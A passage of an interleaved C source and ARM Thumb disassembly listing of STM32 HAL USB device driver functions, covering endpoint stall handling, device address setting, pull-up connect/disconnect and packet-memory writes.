 8007f96:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f9a:	681b      	ldr	r3, [r3, #0]
 8007f9c:	785b      	ldrb	r3, [r3, #1]
 8007f9e:	2b00      	cmp	r3, #0
 8007fa0:	f040 8085 	bne.w	80080ae <USB_EPStartXfer+0x1688>
 8007fa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fa8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fac:	681b      	ldr	r3, [r3, #0]
 8007fae:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007fb2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fb6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fba:	681b      	ldr	r3, [r3, #0]
 8007fbc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007fc0:	b29b      	uxth	r3, r3
 8007fc2:	461a      	mov	r2, r3
 8007fc4:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fc8:	4413      	add	r3, r2
 8007fca:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007fce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fd2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fd6:	681b      	ldr	r3, [r3, #0]
 8007fd8:	781b      	ldrb	r3, [r3, #0]
 8007fda:	00da      	lsls	r2, r3, #3
 8007fdc:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fe0:	4413      	add	r3, r2
 8007fe2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007fe6:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 8007fea:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007fee:	881b      	ldrh	r3, [r3, #0]
 8007ff0:	b29b      	uxth	r3, r3
 8007ff2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007ff6:	b29a      	uxth	r2, r3
 8007ff8:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8007ffc:	801a      	strh	r2, [r3, #0]
 8007ffe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008002:	2b3e      	cmp	r3, #62	; 0x3e
 8008004:	d923      	bls.n	800804e <USB_EPStartXfer+0x1628>
 8008006:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800800a:	095b      	lsrs	r3, r3, #5
 800800c:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008010:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008014:	f003 031f 	and.w	r3, r3, #31
 8008018:	2b00      	cmp	r3, #0
 800801a:	d104      	bne.n	8008026 <USB_EPStartXfer+0x1600>
 800801c:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008020:	3b01      	subs	r3, #1
 8008022:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008026:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800802a:	881b      	ldrh	r3, [r3, #0]
 800802c:	b29a      	uxth	r2, r3
 800802e:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008032:	b29b      	uxth	r3, r3
 8008034:	029b      	lsls	r3, r3, #10
 8008036:	b29b      	uxth	r3, r3
 8008038:	4313      	orrs	r3, r2
 800803a:	b29b      	uxth	r3, r3
 800803c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008040:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008044:	b29a      	uxth	r2, r3
 8008046:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800804a:	801a      	strh	r2, [r3, #0]
 800804c:	e05c      	b.n	8008108 <USB_EPStartXfer+0x16e2>
 800804e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008052:	2b00      	cmp	r3, #0
 8008054:	d10c      	bne.n	8008070 <USB_EPStartXfer+0x164a>
 8008056:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800805a:	881b      	ldrh	r3, [r3, #0]
 800805c:	b29b      	uxth	r3, r3
 800805e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008062:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008066:	b29a      	uxth	r2, r3
 8008068:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800806c:	801a      	strh	r2, [r3, #0]
 800806e:	e04b      	b.n	8008108 <USB_EPStartXfer+0x16e2>
 8008070:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008074:	085b      	lsrs	r3, r3, #1
 8008076:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 800807a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800807e:	f003 0301 	and.w	r3, r3, #1
 8008082:	2b00      	cmp	r3, #0
 8008084:	d004      	beq.n	8008090 <USB_EPStartXfer+0x166a>
 8008086:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800808a:	3301      	adds	r3, #1
 800808c:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008090:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008094:	881b      	ldrh	r3, [r3, #0]
 8008096:	b29a      	uxth	r2, r3
 8008098:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 800809c:	b29b      	uxth	r3, r3
 800809e:	029b      	lsls	r3, r3, #10
 80080a0:	b29b      	uxth	r3, r3
 80080a2:	4313      	orrs	r3, r2
 80080a4:	b29a      	uxth	r2, r3
 80080a6:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80080aa:	801a      	strh	r2, [r3, #0]
 80080ac:	e02c      	b.n	8008108 <USB_EPStartXfer+0x16e2>
 80080ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080b2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080b6:	681b      	ldr	r3, [r3, #0]
 80080b8:	785b      	ldrb	r3, [r3, #1]
 80080ba:	2b01      	cmp	r3, #1
 80080bc:	d124      	bne.n	8008108 <USB_EPStartXfer+0x16e2>
 80080be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080c2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80080c6:	681b      	ldr	r3, [r3, #0]
 80080c8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80080cc:	b29b      	uxth	r3, r3
 80080ce:	461a      	mov	r2, r3
 80080d0:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080d4:	4413      	add	r3, r2
 80080d6:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80080da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080e2:	681b      	ldr	r3, [r3, #0]
 80080e4:	781b      	ldrb	r3, [r3, #0]
 80080e6:	00da      	lsls	r2, r3, #3
 80080e8:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80080ec:	4413      	add	r3, r2
 80080ee:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80080f2:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 80080f6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080fa:	b29a      	uxth	r2, r3
 80080fc:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 8008100:	801a      	strh	r2, [r3, #0]
 8008102:	e001      	b.n	8008108 <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 8008104:	2301      	movs	r3, #1
 8008106:	e03a      	b.n	800817e <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008108:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800810c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008110:	681a      	ldr	r2, [r3, #0]
 8008112:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008116:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800811a:	681b      	ldr	r3, [r3, #0]
 800811c:	781b      	ldrb	r3, [r3, #0]
 800811e:	009b      	lsls	r3, r3, #2
 8008120:	4413      	add	r3, r2
 8008122:	881b      	ldrh	r3, [r3, #0]
 8008124:	b29b      	uxth	r3, r3
 8008126:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800812a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800812e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008132:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008136:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800813a:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800813e:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008142:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8008146:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 800814a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800814e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008152:	681a      	ldr	r2, [r3, #0]
 8008154:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008158:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800815c:	681b      	ldr	r3, [r3, #0]
 800815e:	781b      	ldrb	r3, [r3, #0]
 8008160:	009b      	lsls	r3, r3, #2
 8008162:	441a      	add	r2, r3
 8008164:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008168:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800816c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008170:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008174:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008178:	b29b      	uxth	r3, r3
 800817a:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 800817c:	2300      	movs	r3, #0
}
 800817e:	4618      	mov	r0, r3
 8008180:	f507 7784 	add.w	r7, r7, #264	; 0x108
 8008184:	46bd      	mov	sp, r7
 8008186:	bd80      	pop	{r7, pc}

08008188 <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008188:	b480      	push	{r7}
 800818a:	b085      	sub	sp, #20
 800818c:	af00      	add	r7, sp, #0
 800818e:	6078      	str	r0, [r7, #4]
 8008190:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 8008192:	683b      	ldr	r3, [r7, #0]
 8008194:	785b      	ldrb	r3, [r3, #1]
 8008196:	2b00      	cmp	r3, #0
 8008198:	d020      	beq.n	80081dc <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 800819a:	687a      	ldr	r2, [r7, #4]
 800819c:	683b      	ldr	r3, [r7, #0]
 800819e:	781b      	ldrb	r3, [r3, #0]
 80081a0:	009b      	lsls	r3, r3, #2
 80081a2:	4413      	add	r3, r2
 80081a4:	881b      	ldrh	r3, [r3, #0]
 80081a6:	b29b      	uxth	r3, r3
 80081a8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80081ac:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80081b0:	81bb      	strh	r3, [r7, #12]
 80081b2:	89bb      	ldrh	r3, [r7, #12]
 80081b4:	f083 0310 	eor.w	r3, r3, #16
 80081b8:	81bb      	strh	r3, [r7, #12]
 80081ba:	687a      	ldr	r2, [r7, #4]
 80081bc:	683b      	ldr	r3, [r7, #0]
 80081be:	781b      	ldrb	r3, [r3, #0]
 80081c0:	009b      	lsls	r3, r3, #2
 80081c2:	441a      	add	r2, r3
 80081c4:	89bb      	ldrh	r3, [r7, #12]
 80081c6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80081ca:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80081ce:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80081d2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80081d6:	b29b      	uxth	r3, r3
 80081d8:	8013      	strh	r3, [r2, #0]
 80081da:	e01f      	b.n	800821c <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 80081dc:	687a      	ldr	r2, [r7, #4]
 80081de:	683b      	ldr	r3, [r7, #0]
 80081e0:	781b      	ldrb	r3, [r3, #0]
 80081e2:	009b      	lsls	r3, r3, #2
 80081e4:	4413      	add	r3, r2
 80081e6:	881b      	ldrh	r3, [r3, #0]
 80081e8:	b29b      	uxth	r3, r3
 80081ea:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80081ee:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80081f2:	81fb      	strh	r3, [r7, #14]
 80081f4:	89fb      	ldrh	r3, [r7, #14]
 80081f6:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80081fa:	81fb      	strh	r3, [r7, #14]
 80081fc:	687a      	ldr	r2, [r7, #4]
 80081fe:	683b      	ldr	r3, [r7, #0]
 8008200:	781b      	ldrb	r3, [r3, #0]
 8008202:	009b      	lsls	r3, r3, #2
 8008204:	441a      	add	r2, r3
 8008206:	89fb      	ldrh	r3, [r7, #14]
 8008208:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800820c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008210:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008214:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008218:	b29b      	uxth	r3, r3
 800821a:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 800821c:	2300      	movs	r3, #0
}
 800821e:	4618      	mov	r0, r3
 8008220:	3714      	adds	r7, #20
 8008222:	46bd      	mov	sp, r7
 8008224:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008228:	4770      	bx	lr

0800822a <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 800822a:	b480      	push	{r7}
 800822c:	b087      	sub	sp, #28
 800822e:	af00      	add	r7, sp, #0
 8008230:	6078      	str	r0, [r7, #4]
 8008232:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 8008234:	683b      	ldr	r3, [r7, #0]
 8008236:	7b1b      	ldrb	r3, [r3, #12]
 8008238:	2b00      	cmp	r3, #0
 800823a:	f040 809d 	bne.w	8008378 <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 800823e:	683b      	ldr	r3, [r7, #0]
 8008240:	785b      	ldrb	r3, [r3, #1]
 8008242:	2b00      	cmp	r3, #0
 8008244:	d04c      	beq.n	80082e0 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8008246:	687a      	ldr	r2, [r7, #4]
 8008248:	683b      	ldr	r3, [r7, #0]
 800824a:	781b      	ldrb	r3, [r3, #0]
 800824c:	009b      	lsls	r3, r3, #2
 800824e:	4413      	add	r3, r2
 8008250:	881b      	ldrh	r3, [r3, #0]
 8008252:	823b      	strh	r3, [r7, #16]
 8008254:	8a3b      	ldrh	r3, [r7, #16]
 8008256:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800825a:	2b00      	cmp	r3, #0
 800825c:	d01b      	beq.n	8008296 <USB_EPClearStall+0x6c>
 800825e:	687a      	ldr	r2, [r7, #4]
 8008260:	683b      	ldr	r3, [r7, #0]
 8008262:	781b      	ldrb	r3, [r3, #0]
 8008264:	009b      	lsls	r3, r3, #2
 8008266:	4413      	add	r3, r2
 8008268:	881b      	ldrh	r3, [r3, #0]
 800826a:	b29b      	uxth	r3, r3
 800826c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008270:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008274:	81fb      	strh	r3, [r7, #14]
 8008276:	687a      	ldr	r2, [r7, #4]
 8008278:	683b      	ldr	r3, [r7, #0]
 800827a:	781b      	ldrb	r3, [r3, #0]
 800827c:	009b      	lsls	r3, r3, #2
 800827e:	441a      	add	r2, r3
 8008280:	89fb      	ldrh	r3, [r7, #14]
 8008282:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008286:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800828a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800828e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8008292:	b29b      	uxth	r3, r3
 8008294:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8008296:	683b      	ldr	r3, [r7, #0]
 8008298:	78db      	ldrb	r3, [r3, #3]
 800829a:	2b01      	cmp	r3, #1
 800829c:	d06c      	beq.n	8008378 <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 800829e:	687a      	ldr	r2, [r7, #4]
 80082a0:	683b      	ldr	r3, [r7, #0]
 80082a2:	781b      	ldrb	r3, [r3, #0]
 80082a4:	009b      	lsls	r3, r3, #2
 80082a6:	4413      	add	r3, r2
 80082a8:	881b      	ldrh	r3, [r3, #0]
 80082aa:	b29b      	uxth	r3, r3
 80082ac:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80082b0:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80082b4:	81bb      	strh	r3, [r7, #12]
 80082b6:	89bb      	ldrh	r3, [r7, #12]
 80082b8:	f083 0320 	eor.w	r3, r3, #32
 80082bc:	81bb      	strh	r3, [r7, #12]
 80082be:	687a      	ldr	r2, [r7, #4]
 80082c0:	683b      	ldr	r3, [r7, #0]
 80082c2:	781b      	ldrb	r3, [r3, #0]
 80082c4:	009b      	lsls	r3, r3, #2
 80082c6:	441a      	add	r2, r3
 80082c8:	89bb      	ldrh	r3, [r7, #12]
 80082ca:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80082ce:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80082d2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80082d6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80082da:	b29b      	uxth	r3, r3
 80082dc:	8013      	strh	r3, [r2, #0]
 80082de:	e04b      	b.n	8008378 <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80082e0:	687a      	ldr	r2, [r7, #4]
 80082e2:	683b      	ldr	r3, [r7, #0]
 80082e4:	781b      	ldrb	r3, [r3, #0]
 80082e6:	009b      	lsls	r3, r3, #2
 80082e8:	4413      	add	r3, r2
 80082ea:	881b      	ldrh	r3, [r3, #0]
 80082ec:	82fb      	strh	r3, [r7, #22]
 80082ee:	8afb      	ldrh	r3, [r7, #22]
 80082f0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80082f4:	2b00      	cmp	r3, #0
 80082f6:	d01b      	beq.n	8008330 <USB_EPClearStall+0x106>
 80082f8:	687a      	ldr	r2, [r7, #4]
 80082fa:	683b      	ldr	r3, [r7, #0]
 80082fc:	781b      	ldrb	r3, [r3, #0]
 80082fe:	009b      	lsls	r3, r3, #2
 8008300:	4413      	add	r3, r2
 8008302:	881b      	ldrh	r3, [r3, #0]
 8008304:	b29b      	uxth	r3, r3
 8008306:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800830a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800830e:	82bb      	strh	r3, [r7, #20]
 8008310:	687a      	ldr	r2, [r7, #4]
 8008312:	683b      	ldr	r3, [r7, #0]
 8008314:	781b      	ldrb	r3, [r3, #0]
 8008316:	009b      	lsls	r3, r3, #2
 8008318:	441a      	add	r2, r3
 800831a:	8abb      	ldrh	r3, [r7, #20]
 800831c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008320:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008324:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8008328:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800832c:	b29b      	uxth	r3, r3
 800832e:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8008330:	687a      	ldr	r2, [r7, #4]
 8008332:	683b      	ldr	r3, [r7, #0]
 8008334:	781b      	ldrb	r3, [r3, #0]
 8008336:	009b      	lsls	r3, r3, #2
 8008338:	4413      	add	r3, r2
 800833a:	881b      	ldrh	r3, [r3, #0]
 800833c:	b29b      	uxth	r3, r3
 800833e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8008342:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008346:	827b      	strh	r3, [r7, #18]
 8008348:	8a7b      	ldrh	r3, [r7, #18]
 800834a:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800834e:	827b      	strh	r3, [r7, #18]
 8008350:	8a7b      	ldrh	r3, [r7, #18]
 8008352:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8008356:	827b      	strh	r3, [r7, #18]
 8008358:	687a      	ldr	r2, [r7, #4]
 800835a:	683b      	ldr	r3, [r7, #0]
 800835c:	781b      	ldrb	r3, [r3, #0]
 800835e:	009b      	lsls	r3, r3, #2
 8008360:	441a      	add	r2, r3
 8008362:	8a7b      	ldrh	r3, [r7, #18]
 8008364:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008368:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800836c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008370:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008374:	b29b      	uxth	r3, r3
 8008376:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 8008378:	2300      	movs	r3, #0
}
 800837a:	4618      	mov	r0, r3
 800837c:	371c      	adds	r7, #28
 800837e:	46bd      	mov	sp, r7
 8008380:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008384:	4770      	bx	lr

08008386 <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 8008386:	b480      	push	{r7}
 8008388:	b083      	sub	sp, #12
 800838a:	af00      	add	r7, sp, #0
 800838c:	6078      	str	r0, [r7, #4]
 800838e:	460b      	mov	r3, r1
 8008390:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 8008392:	78fb      	ldrb	r3, [r7, #3]
 8008394:	2b00      	cmp	r3, #0
 8008396:	d103      	bne.n	80083a0 <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 8008398:	687b      	ldr	r3, [r7, #4]
 800839a:	2280      	movs	r2, #128	; 0x80
 800839c:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 80083a0:	2300      	movs	r3, #0
}
 80083a2:	4618      	mov	r0, r3
 80083a4:	370c      	adds	r7, #12
 80083a6:	46bd      	mov	sp, r7
 80083a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083ac:	4770      	bx	lr

080083ae <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 80083ae:	b480      	push	{r7}
 80083b0:	b083      	sub	sp, #12
 80083b2:	af00      	add	r7, sp, #0
 80083b4:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 80083b6:	687b      	ldr	r3, [r7, #4]
 80083b8:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083bc:	b29b      	uxth	r3, r3
 80083be:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80083c2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80083c6:	b29a      	uxth	r2, r3
 80083c8:	687b      	ldr	r3, [r7, #4]
 80083ca:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083ce:	2300      	movs	r3, #0
}
 80083d0:	4618      	mov	r0, r3
 80083d2:	370c      	adds	r7, #12
 80083d4:	46bd      	mov	sp, r7
 80083d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083da:	4770      	bx	lr

080083dc <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 80083dc:	b480      	push	{r7}
 80083de:	b083      	sub	sp, #12
 80083e0:	af00      	add	r7, sp, #0
 80083e2:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 80083e4:	687b      	ldr	r3, [r7, #4]
 80083e6:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 80083ea:	b29b      	uxth	r3, r3
 80083ec:	f3c3 030e 	ubfx	r3, r3, #0, #15
 80083f0:	b29a      	uxth	r2, r3
 80083f2:	687b      	ldr	r3, [r7, #4]
 80083f4:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 80083f8:	2300      	movs	r3, #0
}
 80083fa:	4618      	mov	r0, r3
 80083fc:	370c      	adds	r7, #12
 80083fe:	46bd      	mov	sp, r7
 8008400:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008404:	4770      	bx	lr

08008406 <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 8008406:	b480      	push	{r7}
 8008408:	b085      	sub	sp, #20
 800840a:	af00      	add	r7, sp, #0
 800840c:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 800840e:	687b      	ldr	r3, [r7, #4]
 8008410:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8008414:	b29b      	uxth	r3, r3
 8008416:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 8008418:	68fb      	ldr	r3, [r7, #12]
}
 800841a:	4618      	mov	r0, r3
 800841c:	3714      	adds	r7, #20
 800841e:	46bd      	mov	sp, r7
 8008420:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008424:	4770      	bx	lr

08008426 <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 8008426:	b480      	push	{r7}
 8008428:	b083      	sub	sp, #12
 800842a:	af00      	add	r7, sp, #0
 800842c:	6078      	str	r0, [r7, #4]
 800842e:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8008430:	2300      	movs	r3, #0
}
 8008432:	4618      	mov	r0, r3
 8008434:	370c      	adds	r7, #12
 8008436:	46bd      	mov	sp, r7
 8008438:	f85d 7b04 	ldr.w	r7, [sp], #4
 800843c:	4770      	bx	lr

0800843e <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800843e:	b480      	push	{r7}
 8008440:	b08b      	sub	sp, #44	; 0x2c
 8008442:	af00      	add	r7, sp, #0
 8008444:	60f8      	str	r0, [r7, #12]
 8008446:	60b9      	str	r1, [r7, #8]
 8008448:	4611      	mov	r1, r2
 800844a:	461a      	mov	r2, r3
 800844c:	460b      	mov	r3, r1
 800844e:	80fb      	strh	r3, [r7, #6]
 8008450:	4613      	mov	r3, r2
 8008452:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 8008454:	88bb      	ldrh	r3, [r7, #4]
 8008456:	3301      	adds	r3, #1
 8008458:	085b      	lsrs	r3, r3, #1
 800845a:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 800845c:	68fb      	ldr	r3, [r7, #12]
 800845e:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008460:	68bb      	ldr	r3, [r7, #8]
 8008462:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 8008464:	88fa      	ldrh	r2, [r7, #6]
